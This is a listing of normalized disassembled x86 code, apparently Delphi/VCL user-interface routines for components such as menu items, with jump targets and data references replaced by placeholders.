mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_44ac4c
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_44a848
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_448cac
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4137ac
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4137ac
mov dl [ eax + 0x3f ]
mov eax esi
call sub_44a7ec
sub_44aa88
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_447e84
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_44a848
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_448cac
mov eax ebx
call sub_44a848
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4137ac
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41369c
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_44aafc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_44a720
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44a830
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_44a830
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_44abc4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44a848
mov edx eax
mov ecx esi
mov eax ebx
call sub_44a9d4
pop esi
pop ebx
retn
sub_44abe0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44abac
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_44aa88
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_447e84
sub_44ac08
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_44ac4c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_44ac4c
jmp r-xdata
mov eax ebx
call sub_448cac
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_44c924
sub_44aca4
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov [ ebx + 0x4c ] eax
sub_44accc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403258
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44af60
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403454
mov edx ebx
mov eax edi
call sub_41921c
mov eax ebx
mov si 0xffee
call sub_403454
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_44ad3c
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov [ esi + 0x4c ] eax
sub_44ad70
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_44a848
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_44a858
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_44adb0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44abe0
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_44abc4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44abc4
sub_44ae14
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_44a6d8
sub_44ae40
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_44a6b0
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_44a720
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_44a774
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403fe4
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_44a8a0
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_44a7ec
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_44a87c
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_44a890
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44af60
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44a830
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403454
sub_44af84
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44afa4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44afc4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44afe4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b004
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b024
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b044
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b064
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b084
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b0a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413e34
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_4453ac
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_4454e4
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_445544
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_445244
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_445604
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44b11c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419468
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44a830
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_44accc
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_44b170
jmp r-xdata
xor edx edx
mov eax esi
call sub_448c34
sub_44b170
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_446608
mov eax ebx
call sub_44b1e0
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_44664c
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_41921c
sub_44b1b8
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_44b1b8
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_448308
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_44ac4c
mov eax ebx
pop esi
pop ebx
retn
sub_44b1f4
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40bee8
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4044f0
sub_44b224
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_404028
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_44b2a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44b3ca
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_404250
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_404250
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_4044b0
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40439c
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b3d1
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fb4
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404538
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_404310
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_404250
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_4044b0
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_404310
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_44b408
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44b8a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_404028
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44b868
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_44a848
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_404028
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b8ae
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403fb4
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403fb4
lea eax [ ebp - 0x18 ]
call sub_403f90
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax ebx
call sub_44ba5c
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_44a858
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40439c
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_44b224
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44a858
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44a858
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403258
mov eax [ ebp - 0x20 ]
call sub_403258
mov eax [ ebp - 0x14 ]
call sub_403258
mov eax [ ebp - 0xc ]
call sub_403258
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_44b224
pop ecx
mov eax [ ebp - 0x30 ]
call sub_404250
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_44a858
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_44d300
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407a6c
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403fe4
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40bee8
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40bee8
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44a858
push eax
mov edx esi
mov eax ebx
call sub_44a858
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_4044b0
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407a6c
push ebp
mov eax [ ebp - 0x2c ]
call sub_44b1f4
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_44b1f4
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40bee8
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_404028
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44a858
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_44a858
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_44d26c
mov edx [ ebp - 0x40 ]
pop eax
call sub_403fe4
mov edx esi
mov eax ebx
call sub_44a858
push eax
mov edx esi
mov eax ebx
call sub_44a858
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_404250
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_4044b0
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_44b2a8
mov eax [ ebp - 0x18 ]
call sub_404250
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_4044f0
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404538
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_44b2a8
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_44b904
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_44a848
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_44a848
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44ba88
test al al
je r-xdata
mov eax esi
call sub_44a848
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_44a858
call sub_44b8e0
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_44a858
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_44a858
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44a858
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_44a858
call sub_44b8e0
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_44a858
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44a858
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44a858
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_44a858
call sub_44b8e0
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_44ba5c
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_44ba5c
and eax 0x7f
mov al [ eax + rw-data ]
sub_44ba88
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_44ba88
and eax 0x7f
mov al [ eax + rw-data ]
sub_44bab4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44879c
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_41914c
mov eax [ ebx + 0x34 ]
